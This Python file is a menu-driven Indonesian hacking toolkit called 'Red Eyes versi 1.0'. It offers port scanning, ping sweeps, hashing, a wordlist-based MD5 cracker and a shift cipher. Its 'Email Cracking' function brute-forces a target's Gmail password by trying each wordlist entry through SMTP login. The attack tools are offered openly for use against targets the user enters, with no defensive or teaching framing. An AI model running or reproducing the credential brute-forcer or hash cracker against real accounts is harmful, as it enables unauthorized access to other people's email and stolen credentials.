try:
    import hashlib,time
    import socket, smtplib
    import requests, os, re, subprocess
    from requests import get
except ModuleNotFoundError:
    print ('Salah satu Module tidak ada\ninstall dulu ya..')

class bcolors:
    UNGU = '\033[95m'
    BIRU = '\033[94m'
    HIJAU = '\033[92m'
    KUNING = '\033[93m'
    MERAH = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


def port_scanner():
  socket.setdefaulttimeout(1)
  scan=(input("masukkan ip address target:"))
  daftar_port=[20,21,22,23,25,53,79,80,110,137,138,139,443,445,3306] # bisa di tambahkan portnya
  try:
      print (bcolors.UNGU,"#####################################")
      for port in daftar_port:
          socket_obj = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
          result=socket_obj.connect_ex((scan,int(port)))
          if result==0:
              print (bcolors.HIJAU,"[+]Terbuka port : " + str(port))
              socket_obj.close()
          else:
              print(bcolors.MERAH,"[!]Tertutup port : " + str(port))
              socket_obj.close()
              print (bcolors.ENDC," ")
  except KeyboardInterrupt:
      print('stop')


def cek_ip():
  hostname = socket.gethostname()
  IPAddr = get('https://api.ipify.org').text
  print (bcolors.HIJAU,"Nama host kamu adalah :" + hostname)
  print (bcolors.KUNING,"iP Address perangkat kamu adalh:" + IPAddr)
  print (bcolors.ENDC," ")

def membuat_md5():
  plaintext = input("nilai string :")
  md5 = hashlib.md5()
  md5.update(plaintext.encode("ascii"))
  print (bcolors.UNGU,"nilai hash md5:",md5.hexdigest())
  print (bcolors.ENDC," ")
  
def ping_sweep():
  try:
    for ping in range(1,10):
        alamat = input("Masukkan IP address yang akan di cek: "  + str(ping))
        res = subprocess.call(['ping',alamat])
        if res == 0:
            print (bcolors.HIJAU,"ping ke",alamat,"OK") 
        elif res == 2:
            print (bcolors.MERAH,"Tiada respon dari",alamat)
        else:
            print (bcolors.UNGU,"ping ke",alamat,"gagal!") 
            print (bcolors.ENDC," ")
  except KeyboardInterrupt:
      print ('Stop')

def membuat_sha1():
  plaintext = input("Nilai string :")
  sha = hashlib.sha1()
  sha.update(plaintext.encode("ascii"))
  print (bcolors.HIJAU,"nilai hash sha1 adalah:",sha.hexdigest())
  print (bcolors.ENDC," ")
  
def md5_cracking():
  counter = 1
  md5_hash = input("Hash md5 : ")
  pwdfile = input("alamat worldlist : ")
  
  try:
    pwdfile = open(pwdfile,"r")
  except:
    print ("\nFile tidak di temukan")
    quit()
  
  try:
    for password in pwdfile:
        md5 = hashlib.md5()
        md5.update(password.strip().encode('ascii'))
        start = time.time()
        print ("[*]Coba password %d: %s " % (counter,password.strip()))
        time.sleep(0.1)
    
        counter += 1
        end = time.time()
        t_time = end - start
    
        if md5_hash.strip() == md5.hexdigest():
            print (bcolors.HIJAU,"\n[+]Password ditemukan.\nPassowrdnya adalah : %s" % password.strip())
            print  ("Total waktu : ", t_time,"second")
            time.sleep(10)
            break
        else:
            print (bcolors.MERAH,"\n[!]Password tidak di temukan")
            print (bcolors.ENDC," ")
  except KeyboardInterrupt:
      print ('stop')
     
def check_email():    
  regex = '^[a-z0-9]+[\._]?[a-z0-9]+[@]\w+[.]\w{2,3}$'
  def check(email):
    if(re.search(regex,email)):
        print(bcolors.HIJAU,"Valid email")
    else:
        print(bcolors.MERAH,"Invalid email")
        print (bcolors.ENDC," ")     
  if __name__ == '__main__':
    email = input("Enter email address:")
    check(email)

def bruteEmail():
  smtpserver = smtplib.SMTP("smtp.gmail.com",587)
  smtpserver.ehlo()
  smtpserver.starttls()

  user = input("Masukkan email target :")
  passfile = input("Masukkan tempat file worldlist:")
  passfile = open(passfile,'r')

  try:  
    for password in passfile:
        try:
            smtpserver.login(user, password)    
            print (bcolors.HIJAU,"[+] Password di temukan ====> ",password)
        except smtplib.SMTPAuthenticationError:
            print (bcolors.MERAH,"[!] Password tidak di temukan:(", password)
            time.sleep(0.1)
            print (bcolors.ENDC," ")

  except KeyboardInterrupt:
    print ('Stop')
    
def sandi_geser():
  z=['1','2','3','4','5','6','7','8','9','0','A','B','C','D','E','F','G','H','I','J','K','L','M','N',  'O','P','Q','R','S','T','U','V','W','X','Y','Z','a','b','c','d','e','f','g','h','i','j','k','l','m',  'n','o','p','q','r','s','t','u','v','w','x','y','z']
  print("Sandi Geser")
  a = input("\Masukkan kata = ")
  b = ""
  geser = 7
  for x in range(len(a)):
	  temp = z.index(a[x]) + geser
	  b=b+z[temp%63]
  print(bcolors.UNGU,"\nPlainText = "+a)
  print(bcolors.KUNING,"CipherText = "+b)
  print (bcolors.ENDC," ")
def tampilan_atas():
  print (bcolors.MERAH,"""

.::!!!!!!!:.
  .!!!!!:.                        .:!!!!!!!!!!!!
  ~~~~!!!!!!.                 .:!!!!!!!!!UWWW$$$
      :$$NWX!!:           .:!!!!!!XUWW$$$$$$$$$P
      $$$$$##WX!:      .<!!!!UW$$$$"  $$$$$$$$#
      $$$$$  $$$UX   :!!UW$$$$$$$$$   4$$$$$*
      ^$$$B  $$$$\     $$$$$$$$$$$$   d$$R"
        "*$bd$$$$      '*$$$$$$$$$$$o+#"
                       
""")
  
  print ("""
____ ____ ___  ____ _   _ ____ ____ 
|__/ |___ |  \ |___  \_/  |___ [__  
|  \ |___ |__/ |___   |   |___ ___] 
     
""")
 
  print (50*"=")
  print ("\n")
  print (bcolors.BIRU,"                Red Eyes versi 1.0")
  print ("\n")
  print (bcolors.MERAH,50*"-")
  print (bcolors.UNGU," # Di buat oleh arkrrr")
  print (bcolors.KUNING," #Mohon Maaf bila  script ini tidak terlalu bagus")
  print (bcolors.HIJAU," #Yang merasa kurang ama script ini tenang aja nanti akan di update^_^")
  print (bcolors.KUNING,"hubungi saya di: arkrrr755@gmail.com")
  print (bcolors.ENDC," ")

def menu():
  print (bcolors.HIJAU,"\n")
  print ('='*25,'MENU','='*25)
  print ("[1] Port Scanning")
  print ("[2] Cek IP")
  print ("[3] Membuat md5")
  print ("[4] Ping Sweep")
  print ("[5] Membuat sha1")
  print ("[6] md5 cracking")
  print ("[7] Check Email")
  print ("[8] Email Cracking")
  print ("[9] Membuat Sandi Geser")
  print ("[x] Keluar ")
  
  menu = input("PILIH MENU >")
  print ("\n")
  
  if menu == "1":port_scanner()
  elif menu == "2":cek_ip()
  elif menu == "3":membuat_md5()
  elif menu == "4":ping_sweep()
  elif menu == "5":membuat_sha1()
  elif menu == "6":md5_cracking()
  elif menu == "7":check_email()
  elif menu == "8":bruteEmail()
  elif menu == "9":sandi_geser()
  elif menu == "x":
    print ("terima kasih telah menggunakan tools kami...\nSampi jumpa")
    exit()
  else:
    print ("salah pilih")

tampilan_atas()

menu()
                
 
  
  
